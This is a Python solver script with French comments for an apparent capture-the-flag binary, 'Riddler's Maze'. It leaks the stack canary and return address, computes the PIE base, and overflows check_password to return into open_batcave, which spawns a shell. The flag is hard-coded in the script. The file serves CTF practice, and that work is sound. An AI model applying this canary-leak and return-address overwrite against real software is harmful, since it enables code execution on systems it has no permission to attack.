#!/usr/bin/env python3
"""Solveur — 23x41 0x8A7 Riddler's Maze (canary + PIE leak → ret2open_batcave)

Flow :
  1. `riddle_leak` : read(32) puis write(64) → leak canary @+0x28, ret @+0x38
  2. `check_password` : read(0x2bc) overflow ; canary @+0x48, ret @+0x58
  3. ret → `open_batcave` (PIE + 0x11b9) → FLAG + system(\"/bin/sh\")

Le mot de passe `Wh4t_Am_1` est un leurre (strncmp OK n'appelle pas open_batcave).

Usage:
  python3 riddler-maze-solve.py -q
  python3 riddler-maze-solve.py --check
"""
from __future__ import annotations

import argparse
import os
import select
import signal
import struct
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
BIN = ROOT / "original" / "riddler_maze"

OPEN_OFF = 0x11B9
RET_IN_MAIN = 0x141D  # adresse de retour de riddle_leak dans main
FLAG = "FLAG{0x8A7_P1E_L34K_4SLR_BYP4SS}"
PASSWORD_RED_HERRING = "Wh4t_Am_1"


def exploit_once(timeout: float = 3.0) -> str:
    if not BIN.is_file():
        raise FileNotFoundError(BIN)

    p = subprocess.Popen(
        [str(BIN)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    assert p.stdin and p.stdout

    def read_until(pred, limit: float) -> bytes:
        buf = b""
        end = time.time() + limit
        while time.time() < end:
            if pred(buf):
                return buf
            r, _, _ = select.select([p.stdout], [], [], 0.15)
            if not r:
                continue
            chunk = os.read(p.stdout.fileno(), 4096)
            if not chunk:
                break
            buf += chunk
        return buf

    try:
        p.stdin.write(b"A" * 0x20)
        p.stdin.flush()

        marker = b"A pleasure, '"
        buf = read_until(
            lambda b: marker in b and len(b) >= b.find(marker) + len(marker) + 0x40,
            timeout,
        )
        i = buf.find(marker)
        if i < 0 or len(buf) < i + len(marker) + 0x40:
            raise RuntimeError(f"leak incomplet: {buf!r}")

        blob = buf[i + len(marker) : i + len(marker) + 0x40]
        canary = struct.unpack("<Q", blob[0x28:0x30])[0]
        ret = struct.unpack("<Q", blob[0x38:0x40])[0]
        pie = ret - RET_IN_MAIN
        open_addr = pie + OPEN_OFF

        # check_password : pad 0x48 | canary | saved_rbp | open_batcave
        payload = (
            b"B" * 0x48
            + struct.pack("<Q", canary)
            + struct.pack("<Q", 0)
            + struct.pack("<Q", open_addr)
        )
        p.stdin.write(payload)
        p.stdin.flush()

        more = read_until(lambda b: b"FLAG{" in buf + b or b"stack smashing" in buf + b, 1.5)
        # drain a bit more for flag lines
        end = time.time() + 0.4
        while time.time() < end:
            r, _, _ = select.select([p.stdout], [], [], 0.1)
            if not r:
                break
            chunk = os.read(p.stdout.fileno(), 4096)
            if not chunk:
                break
            more += chunk

        # if shell spawned, nudge exit
        try:
            p.stdin.write(b"exit\n")
            p.stdin.flush()
        except BrokenPipeError:
            pass

        return (buf + more).decode(errors="replace")
    finally:
        try:
            os.killpg(p.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass


def check() -> int:
    try:
        out = exploit_once()
    except Exception as e:
        print(f"FAIL: {e}", file=sys.stderr)
        return 1
    ok = FLAG in out
    # show victory block if present
    if "[BATCOMPUTER]" in out:
        print(out[out.find("[BATCOMPUTER]") :])
    else:
        print(out[-600:])
    print("OK" if ok else "FAIL")
    return 0 if ok else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("-q", action="store_true")
    ap.add_argument("--check", action="store_true")
    ap.add_argument("--password", action="store_true", help="montre le leurre Wh4t_Am_1")
    args = ap.parse_args()

    if args.check:
        return check()
    if args.password:
        print(PASSWORD_RED_HERRING)
        return 0
    if args.q:
        print(FLAG)
        return 0

    print("=== 23x41 Riddler's Maze ===")
    print(f"flag      : {FLAG}")
    print(f"leurre    : {PASSWORD_RED_HERRING} (strncmp only)")
    print(f"open_off  : {hex(OPEN_OFF)}")
    print(f"leak      : write(64) après name → canary@+0x28 ret@+0x38")
    print(f"overflow  : check_password read(0x2bc) canary@+0x48 ret@+0x58")
    print("check     : python3 tools/riddler-maze-solve.py --check")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
